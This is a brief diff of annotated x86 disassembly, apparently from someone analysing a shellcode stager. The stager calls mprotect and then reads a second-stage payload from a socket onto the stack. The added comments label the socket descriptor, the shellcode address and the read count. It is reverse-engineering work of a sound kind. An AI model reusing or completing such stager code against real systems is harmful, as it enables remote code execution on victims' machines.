@@ -203,10 +203,10 @@ eax            0x56556000          1448435712
  | 0x08048186:	int    0x80                                     ; systemcall 0x7d (mprotect)
  | 0x08048188:	test   eax,eax
  | 0x0804818a:	js     0x804819c
- | 0x0804818c:	pop    ebx
- | 0x0804818d:	mov    ecx,esp
- | 0x0804818f:	cdq    
- | 0x08048190:	mov    dl,0x6a
+ | 0x0804818c:	pop    ebx                                      ; socket fd
+ | 0x0804818d:	mov    ecx,esp                                  ; address of shellcode (0xffffd244)
+ | 0x0804818f:	cdq                                               exec here ?
+ | 0x08048190:	mov    dl,0x6a                                  ; read count 0x6a byte
  | 0x08048192:	mov    al,0x3
  | 0x08048194:	int    0x80                                     ; systemcall 0x3 (read)
  | 0x08048196:	test   eax,eax
